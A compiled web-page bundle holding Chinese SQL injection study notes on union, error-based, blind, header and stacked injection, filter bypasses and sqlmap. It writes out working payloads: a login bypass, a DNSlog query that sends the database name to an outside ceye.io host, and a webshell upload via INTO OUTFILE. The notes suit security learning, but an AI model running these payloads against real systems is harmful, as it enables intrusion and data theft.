import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,b as n,o as i}from"./app-vlmk1g_f.js";const r={};function t(l,a){return i(),s("div",null,a[0]||(a[0]=[n('<h1 id="判断sql语句闭合方式" tabindex="-1"><a class="header-anchor" href="#判断sql语句闭合方式"><span>判断SQL语句闭合方式：</span></a></h1><h2 id="原理1" tabindex="-1"><a class="header-anchor" href="#原理1"><span>原理1：</span></a></h2><blockquote><p><strong>MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1&quot;、1-等，<em>只要数字后面的字符不是闭合符的，数据库都会把你输入的错误的数据转换成正确的数据类型</em>。</strong></p><p><strong>但是，若输入的数字后面的字符恰好是闭合符，则会形成闭合，若闭合后形成的sql语句是错误的，那么sql语句执行就会错误，从而造成页面显示错误。</strong></p></blockquote><p>​ eg：如‘1)’会被当做1处理，但是‘{1’只会被当做{处理</p><p>​ <strong>如果’闭合时，输入1‘则其中的’会被视为后闭合符，则数据位‘1’‘，会报错，如果把’改为”则不会报错，并且1“转为1处理，可 以用这种方式判断闭合</strong></p><h2 id="原理2" tabindex="-1"><a class="header-anchor" href="#原理2"><span>原理2：</span></a></h2><p>​ <strong>\\为转义字符，可以使得闭合字符变为字符串</strong></p><h2 id="方法1" tabindex="-1"><a class="header-anchor" href="#方法1"><span>方法1：</span></a></h2><p>​ <strong>闭合为\\查看错误信息,根据错误信息判断闭合</strong></p><h2 id="方法2" tabindex="-1"><a class="header-anchor" href="#方法2"><span>方法2：</span></a></h2><p><strong>首先尝试：</strong><br><strong>?id=1’</strong><br><strong>?id=1”</strong></p><p>​ 结果1：如果都报错，判断闭合符为：<strong>整形闭合。</strong></p><p><strong>结果2：如果单引号报错，双引号不报错。</strong></p><p><strong>继续尝试</strong><br><strong>?id=1’ –-+</strong></p><p>​ 结果1：无报错，判断闭合符为：<strong>单引号闭合。</strong></p><p>​ 结果2：报错，判断闭合符可能为：<strong>单引号加括号。</strong></p><p><strong>结果3：如果单引号不报错，双引号报错。</strong></p><p><strong>继续尝试</strong><br><strong>?id=1&quot; -–+</strong></p><p>​ 结果1：结果无报错，判断闭合符为：<strong>双引号闭合。</strong></p><p>​ 结果2：报错，判断闭合符可能为：<strong>双引号加括号。</strong></p><h2 id="如果是整形闭合" tabindex="-1"><a class="header-anchor" href="#如果是整形闭合"><span>如果是整形闭合：</span></a></h2><p><strong>判断是否有隐式闭合</strong></p><p>​ <img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/4.png" alt="4" loading="lazy"></p><p><strong>直到不报错为止</strong></p><h2 id="完全盲注-不会显示错误信息-正确信息和错误信息也不区分-判断闭合方式" tabindex="-1"><a class="header-anchor" href="#完全盲注-不会显示错误信息-正确信息和错误信息也不区分-判断闭合方式"><span>完全盲注（不会显示错误信息，正确信息和错误信息也不区分）判断闭合方式</span></a></h2><p>?id=1&#39; and if(1=1,sleep(5),3)--+</p><p>若闭合方式为真，则会进行延迟</p><h1 id="过滤掉注释符的判断闭合的判断方法" tabindex="-1"><a class="header-anchor" href="#过滤掉注释符的判断闭合的判断方法"><span>过滤掉注释符的判断闭合的判断方法</span></a></h1><ul><li>用?id=1&#39; or &#39;1&#39; = &#39;1&#39;的形式判断闭合</li></ul><h1 id="post-带有账户验证-且不知道账户密码-没有报错" tabindex="-1"><a class="header-anchor" href="#post-带有账户验证-且不知道账户密码-没有报错"><span>post，带有账户验证，且不知道账户密码，没有报错</span></a></h1><p>利用万能密码测试闭合，账号密码都输入<br> 1&#39;or+1=1</p><hr><h2 id="database-爆库名" tabindex="-1"><a class="header-anchor" href="#database-爆库名"><span><strong><code> database()</code></strong>：(爆库名)</span></a></h2><ul><li><p>​ <code>database()</code> 是一个 SQL 函数，用于返回当前数据库的名称。</p><hr></li></ul><h1 id="union联合注入" tabindex="-1"><a class="header-anchor" href="#union联合注入"><span>UNION联合注入</span></a></h1><p>union前面的操作不可行的话，后面的操作会被单独执行</p><p>tips：<strong><code>UNION</code> 操作符要求所有参与的 SELECT 语句返回相同数量的列，并且这些列的顺序和数据类型也必须兼容。</strong></p><hr><h1 id="limit-n1-n2-显示排" tabindex="-1"><a class="header-anchor" href="#limit-n1-n2-显示排"><span>limit n1,n2 （显示排）</span></a></h1><p>​ <strong>用slelect显示行数，用limit限制行数，n1,n2,在第n1排后面显示n2个排</strong></p><p>​ tips：<strong>此方法可由GROUP_CONCAT代替，用来一次性显示所有列的排</strong></p><hr><h1 id="information-schema-tables-爆表名-包含以下主要列" tabindex="-1"><a class="header-anchor" href="#information-schema-tables-爆表名-包含以下主要列"><span><code>information_schema.tables</code>（爆表名）包含以下主要列：</span></a></h1><ul><li><p><strong>TABLE_CATALOG</strong>：表的目录。</p></li><li><p><strong>TABLE_SCHEMA</strong>：表的模式（schema），即数据库的名称。</p></li><li><p><strong>TABLE_NAME</strong>：表的名称。（爆表名用）</p></li><li><p><strong>TABLE_TYPE</strong>：表的类型，通常是<code>BASE TABLE</code>（基本表）或<code>VIEW</code>（视图）。</p></li><li><p><strong>ENGINE</strong>：表使用的存储引擎（如InnoDB、MyISAM等）。</p></li><li><p><strong>ROW_FORMAT</strong>：行格式。</p></li><li><p><strong>TABLE_ROWS</strong>：表中的行数。</p></li><li><p><strong>CREATE_TIME</strong>：表的创建时间。</p></li><li><p><strong>UPDATE_TIME</strong>：表的最后更新时间。</p><h1 id="information-schema-columns-爆列名-包含以下主要列" tabindex="-1"><a class="header-anchor" href="#information-schema-columns-爆列名-包含以下主要列"><span><code>information_schema.columns</code>(爆列名)包含以下主要列：</span></a></h1><ul><li><p><strong>TABLE_CATALOG</strong>：表的目录（通常是数据库名）。</p></li><li><p><strong>TABLE_SCHEMA</strong>：表的模式（schema），即数据库的名称。</p></li><li><p><strong>TABLE_NAME</strong>：表的名称。</p></li><li><p><strong>COLUMN_NAME</strong>：列的名称。</p></li><li><p><strong>ORDINAL_POSITION</strong>：列在表中的位置（从1开始）。</p></li><li><p><strong>COLUMN_DEFAULT</strong>：列的默认值。</p></li><li><p><strong>IS_NULLABLE</strong>：列是否可以为NULL（YES或NO）。</p></li><li><p><strong>DATA_TYPE</strong>：列的数据类型（如VARCHAR、INT等）。</p></li><li><p><strong>CHARACTER_MAXIMUM_LENGTH</strong>：字符列的最大长度（适用于字符类型）。</p></li><li><p><strong>NUMERIC_PRECISION</strong>：数值列的精度（适用于数值类型）。</p></li><li><p><strong>DATETIME_PRECISION</strong>：日期时间列的精度。</p><h1 id="information-schema-schemata-爆库名-视图通常包含以下几个重要字段" tabindex="-1"><a class="header-anchor" href="#information-schema-schemata-爆库名-视图通常包含以下几个重要字段"><span><code>information_schema.schemata</code> (爆库名)视图通常包含以下几个重要字段：</span></a></h1><ul><li><strong>CATALOG_NAME</strong>: 数据库目录的名称。</li><li><strong>SCHEMA_NAME</strong>: 模式的名称。</li><li><strong>DEFAULT_CHARACTER_SET_NAME</strong>: 默认字符集的名称。</li><li><strong>DEFAULT_COLLATION_NAME</strong>: 默认排序规则的名称。</li><li><strong>SQL_PATH</strong>: SQL 路径（如果适用）。</li></ul><hr></li></ul><h1 id="group-concat" tabindex="-1"><a class="header-anchor" href="#group-concat"><span>GROUP_CONCAT</span></a></h1></li></ul><p><strong>在SQL中，<code>GROUP_CONCAT</code>是一个聚合函数，用于将多个行的值连接成一个字符串，通常用于在分组查询中。</strong></p><h3 id="group-concat的基本语法如下" tabindex="-1"><a class="header-anchor" href="#group-concat的基本语法如下"><span><code>**GROUP_CONCAT</code>的基本语法如下：**</span></a></h3><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">GROUP_CONCAT(expression </span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">[ORDER BY ...]</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> [SEPARATOR &#39;separator&#39;]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li><p><strong>expression</strong>：要连接的列或表达式。</p></li><li><p><strong>ORDER BY</strong>：可选，指定连接值的顺序。</p></li><li><p><strong>SEPARATOR</strong>：可选，指定连接值之间的分隔符，默认为逗号（<code>,</code>）。</p><p>tips:<strong>只能在单独变量名中使用</strong>，如group_concat(TABLE_NAME)，因为只是数据本身导致了多行输出，而不是表达式</p></li></ul><hr><h1 id="concat" tabindex="-1"><a class="header-anchor" href="#concat"><span>CONCAT()</span></a></h1><p><strong>是 SQL 中用于连接两个或多个字符串的函数。它可以用于将多个字符串合并为一个字符串，通常在处理文本数据时非常有用。以下是关于 <code>CONCAT</code> 函数的一些关键点和示例。</strong></p><p>CONCAT(string1, string2, ..., stringN)</p><hr><h1 id="注入方法使用优先级" tabindex="-1"><a class="header-anchor" href="#注入方法使用优先级"><span>注入方法使用优先级</span></a></h1><p>联合注入</p><p>报错注入</p><p>布尔盲注</p><p>时间盲注</p><p><strong>特殊</strong></p><p>文件导入</p><hr><h1 id="报错注入" tabindex="-1"><a class="header-anchor" href="#报错注入"><span>报错注入</span></a></h1><p>适用于只有错误的命令能被回显而合法命令不会回显的情况</p><h1 id="updatexml" tabindex="-1"><a class="header-anchor" href="#updatexml"><span><code>updatexml()</code></span></a></h1><p>格式为updatexml(xml文件1,文件路径,xml文件2),常用句式 and updatexml(1,concat(表达式),1)</p><hr><h1 id="布尔注入-比大小" tabindex="-1"><a class="header-anchor" href="#布尔注入-比大小"><span>布尔注入(比大小)</span></a></h1><ol><li><p>用and length(database())接比较运算符，and后数据为真才会执行</p></li><li><p><strong>得到数据库名</strong></p><p>这个时候要得到数据库名则需要使用两个函数：</p><p>①<code>ascii()</code>返回字符的ASCII码</p><p>②<code>substr(str,start,length)</code>返回字符串从str的start开始往后截取length长度的字符</p><p>​ 或许可以用left()从左到有索引字符串</p><p>两个函数的搭配使用：可以得到数据库名的所有字符的ascii码</p><h6 id="_3推测数据库中的表信息" tabindex="-1"><a class="header-anchor" href="#_3推测数据库中的表信息"><span>③推测数据库中的表信息</span></a></h6><p>该步骤需要用到information_schema数据库且包含3小步：猜表的数量–&gt;猜表的名称的长度–&gt;猜表的名称</p></li></ol><h6 id="猜表的数量" tabindex="-1"><a class="header-anchor" href="#猜表的数量"><span>猜表的数量</span></a></h6><p>此处需要使用到<code>count</code>函数；<code>COUNT()</code>函数是SQL中的一个聚合函数，用于计算指定列中的非空值的数量，它可以应用于不同的场景，如统计某个表中的行数、统计满足特定条件的行数等。</p><hr><h1 id="docker进入镜像" tabindex="-1"><a class="header-anchor" href="#docker进入镜像"><span>docker进入镜像</span></a></h1><p>docker exec -it 镜像id /bin/bash：/bin/bash 代表bash shell，是一个终端</p><hr><h1 id="文件导入" tabindex="-1"><a class="header-anchor" href="#文件导入"><span>文件导入</span></a></h1><p>利用union后接一句话木马以及into outfile+文件绝对路径，即可导入文件，这时可能提示错误，但没关系</p><p>最后用蚁剑连接相对路径即可</p><p>注意最好把木马用“闭合，否则可能失败、</p><hr><h1 id="时间盲注" tabindex="-1"><a class="header-anchor" href="#时间盲注"><span>时间盲注</span></a></h1><p>依靠if的特性if(条件表达式，True,False)<br> 关键在于sleep函数</p><p>True填sleep()，意思是正确就沉默</p><p>False占位即可，错误不延迟</p><p>其他参考布尔盲注</p><p>tips：<strong>if与原语句必须用and或or连接</strong>，否则会报错</p><hr><h1 id="user-agent注入" tabindex="-1"><a class="header-anchor" href="#user-agent注入"><span>user-agent注入</span></a></h1><p>user-agent优先级在GET和POST注入之后</p><p>判断闭合:先输入&#39;或“检查是否报错，再用&#39; and &#39;1&#39; = &#39;1检查是否报错，不报错则是&#39;闭合,之后用报错注入即可</p><hr><h1 id="refer头注入" tabindex="-1"><a class="header-anchor" href="#refer头注入"><span>refer头注入</span></a></h1><p>在请求头中的refer中进行sql语句报错注入，同user-agent注入</p><hr><h1 id="cookie头注入" tabindex="-1"><a class="header-anchor" href="#cookie头注入"><span>cookie头注入</span></a></h1><hr><h1 id="注释符被过滤" tabindex="-1"><a class="header-anchor" href="#注释符被过滤"><span>注释符被过滤</span></a></h1><ul><li>注释符绕过：只需要在末尾加入‘1’ = ‘1即可</li></ul><hr><ul><li>对于写在后端代码的单词检测，可以使用双写绕过<br> 如or绕过，则information可以改为infoorrmation</li></ul><p>对于逻辑运算符，注释符以及空格过滤：</p><ul><li>空格绕过：%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%20 空格、()</li><li>逻辑运算符绕过：双写绕过或&amp;&amp;、||</li><li>‘:%27</li></ul><h1 id="使用-进行转义但gbk编码-绕过" tabindex="-1"><a class="header-anchor" href="#使用-进行转义但gbk编码-绕过"><span>使用\\进行转义但GBK编码 绕过</span></a></h1><ul><li>GBK编码与ascii编码对应，GBK编码可以处理两字节的“宽字节”的数据，dang用#### preg_replace 函数进行过滤时候可以在敏感字符前加入%df使得\\转义失败%df与%5c()结合成为宽字节，形成‘縗’从而绕过转义</li><li>因为在爆字段时候的填写表名的时候需要采用&#39;users&#39;的格式，所以可以用16进制编码代替，如0x7573657273为users</li></ul><hr><h1 id="堆叠注入" tabindex="-1"><a class="header-anchor" href="#堆叠注入"><span>堆叠注入</span></a></h1><ol><li>目标存在sql注入漏洞</li><li>目标未对&quot;;&quot;号进行过滤</li><li>目标中间层查询数据库信息时可同时执行多条sql语句（如使用mysqli_multi_query()函数）<br> 用法：用;对原语句进行换行处理，然后再进行更多的sql数据库操作</li></ol><hr><h1 id="dnslog外带注入" tabindex="-1"><a class="header-anchor" href="#dnslog外带注入"><span>DNSlog外带注入</span></a></h1><p>注入条件：</p><ol><li>MySQL 开启 load_file ()</li><li>DNSLog 平台 （<a href="http://hyuga.co/" target="_blank" rel="noopener noreferrer">Hyuga</a>、<a href="http://ceye.io/" target="_blank" rel="noopener noreferrer">CEYE</a>）</li><li>MYSQL数据库在Windows 平台</li></ol><p>适合的条件：</p><ol><li>SQL盲注、无回显的命令执行、无回显的SSRF</li><li>只能用于windows系统</li><li>需要用到mysql中的load_file()函数，在Mysql中，load_file()函数读取一个文件并将其内容作为字符串返回。（不绝对，仅仅只是列举了mysql数据库的函数）</li></ol><p>注意：</p><ol><li>每次最多取63字节</li><li>DNSlog网址前的 . 必不可少</li><li><code>show variables like &#39;%secure%&#39;;</code>查看load_file()可以读取的磁盘。</li></ol><p>前置知识——UNC路径:</p><ol><li>windows的命名惯例，可以依靠添加“<code>\\\\\\\\</code>”来引发DNS解析，<code>\\\\\\\\</code>转义后就是<code>\\\\</code></li></ol><p>示例命令：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>?id=-1&#39;)) union SELECT LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,(SELECT HEX(database())),&#39;.m8rwsy.ceye.io\\\\abc&#39;)),2,3--+</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li>LOAD_FILE：关键命令，读取文件内容</li><li>CONCAT：连接字符串</li><li><code>.m8rwsy.ceye.io\\\\abc</code>:指定的DNSlog网址</li></ul><hr><h1 id="测试注释符" tabindex="-1"><a class="header-anchor" href="#测试注释符"><span>测试注释符</span></a></h1><p>?id=11#1 回显admin3,说明注释符都能用<br> ?id=11--+1 回显admin3</p><hr><h1 id="order-by" tabindex="-1"><a class="header-anchor" href="#order-by"><span>order by</span></a></h1><p>有order by作为后端的SQL语句时，union不可用</p><h2 id="sqlmap" tabindex="-1"><a class="header-anchor" href="#sqlmap"><span>sqlmap</span></a></h2><p>^sqlmap</p><figure><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/sqlmap.png" alt="sqlmap" tabindex="0" loading="lazy"><figcaption>sqlmap</figcaption></figure><h2 id="补充" tabindex="-1"><a class="header-anchor" href="#补充"><span>补充</span></a></h2><ul><li>如果需要验证登录如302重定向，需要--cookie后接cookie来进行登录</li><li>如果url中有多个参数，用<code>-p</code>来指定参数如 <code>-p id</code>就是指定id参数</li><li>--file-read=&quot;/etc/passwd&quot;:读取文件内容<br> [[DVWA#^d5e614|sqlmap应用]]</li></ul>',130)]))}const h=e(r,[["render",t],["__file","sql注入.html.vue"]]),d=JSON.parse('{"path":"/article/03_%E8%B5%84%E6%BA%90/SQL%E6%B3%A8%E5%85%A5%E5%93%92/sql%E6%B3%A8%E5%85%A5.html","title":"sql注入","lang":"zh-CN","frontmatter":{"icon":"pen-to-square","date":"2024-12-10T00:00:00.000Z","category":["资源"],"tags":null,"title":"sql注入","description":"判断SQL语句闭合方式： 原理1： MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1\\"、1-等，只要数字后面的字符不是闭合符的，数据库都会把你输入的错误的数据转换成正确的数据类型。 但是，若输入的数字后面的字符恰好是闭合符，则会形成闭合，若闭合后形成的sql语句是错误的，那么sql...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/03_%E8%B5%84%E6%BA%90/SQL%E6%B3%A8%E5%85%A5%E5%93%92/sql%E6%B3%A8%E5%85%A5.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"sql注入"}],["meta",{"property":"og:description","content":"判断SQL语句闭合方式： 原理1： MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1\\"、1-等，只要数字后面的字符不是闭合符的，数据库都会把你输入的错误的数据转换成正确的数据类型。 但是，若输入的数字后面的字符恰好是闭合符，则会形成闭合，若闭合后形成的sql语句是错误的，那么sql..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/4.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-10-18T12:26:16.000Z"}],["meta",{"property":"article:published_time","content":"2024-12-10T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-10-18T12:26:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"sql注入\\",\\"image\\":[\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/4.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/sqlmap.png\\"],\\"datePublished\\":\\"2024-12-10T00:00:00.000Z\\",\\"dateModified\\":\\"2025-10-18T12:26:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"原理1：","slug":"原理1","link":"#原理1","children":[]},{"level":2,"title":"原理2：","slug":"原理2","link":"#原理2","children":[]},{"level":2,"title":"方法1：","slug":"方法1","link":"#方法1","children":[]},{"level":2,"title":"方法2：","slug":"方法2","link":"#方法2","children":[]},{"level":2,"title":"如果是整形闭合：","slug":"如果是整形闭合","link":"#如果是整形闭合","children":[]},{"level":2,"title":"完全盲注（不会显示错误信息，正确信息和错误信息也不区分）判断闭合方式","slug":"完全盲注-不会显示错误信息-正确信息和错误信息也不区分-判断闭合方式","link":"#完全盲注-不会显示错误信息-正确信息和错误信息也不区分-判断闭合方式","children":[]},{"level":2,"title":"database()：(爆库名)","slug":"database-爆库名","link":"#database-爆库名","children":[{"level":3,"title":"**GROUP_CONCAT的基本语法如下：**","slug":"group-concat的基本语法如下","link":"#group-concat的基本语法如下","children":[]}]},{"level":2,"title":"sqlmap","slug":"sqlmap","link":"#sqlmap","children":[]},{"level":2,"title":"补充","slug":"补充","link":"#补充","children":[]}],"git":{"createdTime":1734598308000,"updatedTime":1760790376000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":1547,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":8.25,"words":2474},"filePathRelative":"article/03_资源/SQL注入哒/sql注入.md","localizedDate":"2024年12月10日","excerpt":"\\n<h2>原理1：</h2>\\n<blockquote>\\n<p><strong>MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1\\"、1-等，<em>只要数字后面的字符不是闭合符的，数据库都会把你输入的错误的数据转换成正确的数据类型</em>。</strong></p>\\n<p><strong>但是，若输入的数字后面的字符恰好是闭合符，则会形成闭合，若闭合后形成的sql语句是错误的，那么sql语句执行就会错误，从而造成页面显示错误。</strong></p>\\n</blockquote>\\n<p>​\\t\\teg：如‘1)’会被当做1处理，但是‘{1’只会被当做{处理</p>","autoDesc":true}');export{h as comp,d as data};
